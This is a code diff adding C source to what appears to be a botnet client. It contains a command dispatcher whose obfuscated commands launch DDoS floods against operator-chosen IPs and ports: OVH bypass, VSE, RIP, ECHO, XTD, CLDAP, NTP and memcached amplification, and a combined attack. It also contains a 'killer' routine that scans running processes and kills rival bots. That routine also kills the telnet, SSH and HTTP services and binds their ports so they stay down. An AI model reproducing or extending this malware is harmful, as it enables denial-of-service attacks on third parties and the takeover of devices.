+    if(!strcmp(argv[0], "OVH")){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendOvhBypassTwo(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendOvhBypassTwo(ip, port, time);
+            _exit(0);
+        }
+    }
+
+    // command for OvhBypassThree attack
+    if(!strcmp(argv[0], decode("jge"))){
+        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[3]) > 10000) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        if(strstr(ip, ",") != NULL){
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL){
+                if(!listFork()){
+                    sendOvhBypassThree(hi, port, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) { return; }
+            sendOvhBypassThree(ip, port, time);
+            _exit(0);
+        }
+    }
+    // vseattack command: sends a VSE attack to the specified IP and port for a given time
+    if(!strcmp(argv[0], decode("g6m"))) {
+        if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1) {
+            return;
+        }
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        int spoofed = 32;
+        int packetsize = 1024;
+        int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+        int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+        int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+
+        if(strstr(ip, ",") != NULL) {
+            unsigned char *hi = strtok(ip, ",");
+            while(hi != NULL) {
+                if(!listFork()) {
+                    vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                    _exit(0);
+                }   
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (!listFork()) {
+                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                _exit(0);
+            }
+        }
+    }
+    // ripattack command: sends a RIP attack to the specified IP and port for a given time
+    if(!strcmp(argv[0], decode("vx|"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        ripattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                ripattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // echoattack command: sends an ECHO attack to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("mDej"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        echoattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                echoattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // xtdattack command: sends an XTD attack to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("+c-"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // cldapattack command: sends a CLDAP attack to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("~-7|"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // ntpattack command: sends an NTP attack to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("6-|"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // memattack command: sends a MEM attack to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("hmh"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);}
+                _exit(0);
+            }
+        }
+        // combined attack command: sends multiple types of attacks to the specified IP and port for a given time
+        if(!strcmp(argv[0], decode("<7hm"))) {
+            if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[3]) > 10000 || atoi(argv[2]) == -1){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int packetsize = 1024;
+            int pollinterval = (argc > 4 ? atoi(argv[4]) : 1000);
+            int sleepcheck = (argc > 5 ? atoi(argv[5]) : 1000000);
+            int sleeptime = (argc > 6 ? atoi(argv[6]) : 0);
+            if(strstr(ip, ",") != NULL) {
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL) {
+                    if(!listFork()) {
+                        memattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        cldapattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        ntpattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        xtdattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (!listFork()){
+                        memattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        ntpattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        xtdattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                        cldapattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
+                    }
+                _exit(0);
+            }
+        }
+        // kills all child processes spawned by this program
+        if(!strcmp(argv[0], decode("6cj|")))
+        {
+                int killed = 0;
+                unsigned long i;
+                for (i = 0; i < numpids; i++)
+                {
+                        if (pids[i] != 0 && pids[i] != getpid())
+                        {
+                                kill(pids[i], 9);
+                                killed++;
+                        }
+                }
+                if(killed > 0)
+                {
+                    //
+                } else {
+                            //
+                       }
+        }
+}
+// converts hexadecimal string to binary
+void hex2bin(const char* in, size_t len, unsigned char* out) {
+  static const unsigned char TBL[] = {
+     0,   1,   2,   3,   4,   5,   6,   7,   8,   9,  58,  59,
+    60,  61,  62,  63,  64,  10,  11,  12,  13,  14,  15
+  };
+  static const unsigned char *LOOKUP = TBL - 48;
+  const char* end = in + len;
+
+  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];
+}
+
+// array of known bot signatures in hexadecimal format
+char *knownBots[] = {
+    // list of known bots
+    // each string is a hexadecimal representation of a bot signature
+};
+
+// checks if a specific memory buffer contains any known bot signatures
+int mem_exists(char *buf, int buf_len, char *str, int str_len) {
+    int matches = 0;
+
+    if (str_len > buf_len)
+        return 0;
+
+    while (buf_len--) {
+        if (*buf++ == str[matches]) {
+            if (++matches == str_len)
+                return 1;
+        } else
+            matches = 0;
+    }
+
+    return 0;
+}
+
+int killer_pid;
+char *killer_realpath;
+int killer_realpath_len = 0;
+
+// checks if the process has access to its own executable path
+int has_exe_access(void) {
+    char path[PATH_MAX], *ptr_path = path, tmp[16];
+    int fd, k_rp_len;
+
+    // construct the path to /proc/$pid/exe
+    ptr_path += util_strcpy(ptr_path, "/proc/");
+    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
+    ptr_path += util_strcpy(ptr_path, "/exe");
+
+    // attempt to open the file
+    if ((fd = open(path, O_RDONLY)) == -1) {
+        return 0;
+    }
+    close(fd);
+
+    // read the symbolic link to get the real path of the process
+    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1) {
+        killer_realpath[k_rp_len] = 0;
+    }
+
+    util_zero(path, ptr_path - path);
+
+    return 1;
+}
+
+// matches memory signatures against known bots
+int memory_j83j_match(char *path) {
+    int fd, ret;
+    char rdbuf[4096];
+    int found = 0;
+    int i;
+    if ((fd = open(path, O_RDONLY)) == -1) return 0;
+    unsigned char searchFor[64];
+    util_zero(searchFor, sizeof(searchFor));
+
+    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
+        for (i = 0; i < NUMITEMS(knownBots); i++) {
+            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
+            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))) {
+                found = 1;
+                break;
+            }
+            util_zero(searchFor, sizeof(searchFor));
+        }
+    }
+
+    close(fd);
+
+    return found;
+}
+#define KILLER_MIN_PID              1000
+#define KILLER_RESTART_SCAN_TIME    1
+
+// killer function that scans and kills certain processes
+void killer_xywz(int parentpid)
+{
+    int killer_highest_pid = KILLER_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
+    uint32_t j83j_counter = 0;
+    struct sockaddr_in tmp_bind_addr;
+
+    // let parent continue on main thread
+    killer_pid = fork();
+    if (killer_pid > 0 || killer_pid == -1)
+        return;
+
+    tmp_bind_addr.sin_family = AF_INET;
+    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;
+
+#ifdef KILLER_REBIND_TELNET
+    // kill telnet service and prevent it from restarting
+    killer_kill_by_port(HTONS(23));
+    
+    tmp_bind_addr.sin_port = HTONS(23);
+
+    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+    {
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        listen(tmp_bind_fd, 1);
+    }
+#endif
+
+#ifdef KILLER_REBIND_SSH
+    // kill ssh service and prevent it from restarting
+    killer_kill_by_port(HTONS(22));
+    
+    tmp_bind_addr.sin_port = HTONS(22);
+
+    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+    {
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        listen(tmp_bind_fd, 1);
+    }
+#endif
+
+#ifdef KILLER_REBIND_HTTP
+    // kill http service and prevent it from restarting
+    killer_kill_by_port(HTONS(80));
+    tmp_bind_addr.sin_port = HTONS(80);
+
+    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+    {
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        listen(tmp_bind_fd, 1);
+    }
+#endif
+
+    // check for executable access and get real path
+    killer_realpath = malloc(PATH_MAX);
+    killer_realpath[0] = 0;
+    killer_realpath_len = 0;
+
+    if (!has_exe_access())
+    {
+        return;
+    }
+
+    while (1)
+    {
+        DIR *dir;
+        struct dirent *file;
+        if ((dir = opendir("/proc/")) == NULL)
+        {
+            break;
+        }
+        while ((file = readdir(dir)) != NULL)
+        {
+            // skip non-pid folders
+            if (*(file->d_name) < '0' || *(file->d_name) > '9')
+                continue;
+
+            char exe_path[64], realpath[PATH_MAX];
+            char status_path[64];
+            int rp_len, fd, pid = atoi(file->d_name);
+            j83j_counter++;
+
+            // skip certain pids
+            if (pid <= killer_highest_pid && pid != parentpid || pid != getpid())
+            {
+                if (time(NULL) - last_pid_j83j > KILLER_RESTART_SCAN_TIME)
+                    killer_highest_pid = KILLER_MIN_PID;
+                else if (pid > KILLER_MIN_PID && j83j_counter % 10 == 0)
+                    sleep(1); // sleep to wait for process spawn
+
+                continue;
+            }
+            if (pid > killer_highest_pid)
+                killer_highest_pid = pid;
+            last_pid_j83j = time(NULL);
+
+            // construct paths
+            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
+            snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
+
+            // read the link of exe_path
+            if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
+            {
+                realpath[rp_len] = 0; // null-terminate realpath
+
+                // skip certain files
+                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
+                    continue;
+
+                if ((fd = open(realpath, O_RDONLY)) == -1)
+                {
+                    kill(pid, 9);
+                }
+                close(fd);
+            }
+
+            // check memory for known bots
+            if (memory_j83j_match(exe_path))
+            {
+                kill(pid, 9);
+            } 
+
+            // clear path buffers
+            util_zero(exe_path, sizeof(exe_path));
+            util_zero(status_path, sizeof(status_path));
+
+            sleep(1);
+        }
+
+        closedir(dir);
+    }
 }
 
 /**
